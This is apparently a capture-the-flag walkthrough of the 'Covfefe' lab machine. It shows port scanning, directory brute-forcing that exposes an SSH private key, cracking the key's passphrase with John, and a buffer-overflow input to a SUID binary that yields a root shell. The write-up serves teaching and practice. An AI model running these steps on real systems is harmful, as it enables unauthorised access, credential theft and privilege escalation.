# Covfefe

## Nmap

```
sudo nmap 192.168.184.10 -p- -sS -sV                            


PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.4p1 Debian 10 (protocol 2.0)
80/tcp    open  http    nginx 1.10.3
31337/tcp open  Elite?
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

I started off with port 80 and was unable to identify any directories or files. The default page for the port goes to installation for nginix.

![](<../../../.gitbook/assets/image (1245).png>)

When attempting to browse to port 31337 we are given a 404 not found error. I then ran `dirsearch.py` against the port using the command below which discovered what appeared to be a users home directory contents.

```
python3 dirsearch.py -u http://192.168.184.10:31337 -w /usr/share/seclists/Discovery/Web-Content/big.txt -t 60 --full-url
```

![](<../../../.gitbook/assets/image (1246).png>)

Checking out the /.ssh directory appears to list sub folder contents.

![](<../../../.gitbook/assets/image (1247).png>)

I first downloaded the id\_rsa and then authorized\_keys.

```
http://192.168.184.10:31337/.ssh/id_rsa
http://192.168.184.10:31337/.ssh/authorized_keys
```

Viewing the contents of authorized\_keys shows the user simon having a key in the file. First use `chmod` on the id\_rsa to set the correct permissions.

```
chmod 600 id_rsa
```

When attempting to use the key to connect by SSH we are prompted to provide a passphrase.

![](<../../../.gitbook/assets/image (1248).png>)

Using ssh2john we can convert the key to a hash which can be sent to John for cracking.

```
/usr/share/john/ssh2john.py id_rsa > /home/kali/Desktop/hash
sudo john --wordlist=/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-100000.txt /home/kali/Desktop/hash
```

![](<../../../.gitbook/assets/image (1249).png>)

Now that we have the password `starwars` for for the key we can try signing in again.

```
ssh -i id_rsa simon@192.168.184.10
```

![](<../../../.gitbook/assets/image (1250).png>)

I then transferred over `linpeas` and executed. Linpeas then identified the binary `/usr/local/bin/read_message` as having the SUID bit set.

![](<../../../.gitbook/assets/image (1251).png>)

Running the binary and entering the name 'Simon' produces the following output:

![](<../../../.gitbook/assets/image (1252).png>)

As per the message we can read the source code. Listing the contents of the root directory shows the source code file.

![](<../../../.gitbook/assets/image (1253).png>)

It looks like as per the script it will read the first 5 characters to validate if correct but, has a total buffer for 20. We can try to overflow the buffer to execute a command.

Running the following when prompted to do so by the binary will give us a root shell.

```
Simonaaaaaaaaaaaaaaa/bin/sh
```

![](<../../../.gitbook/assets/image (1254).png>)
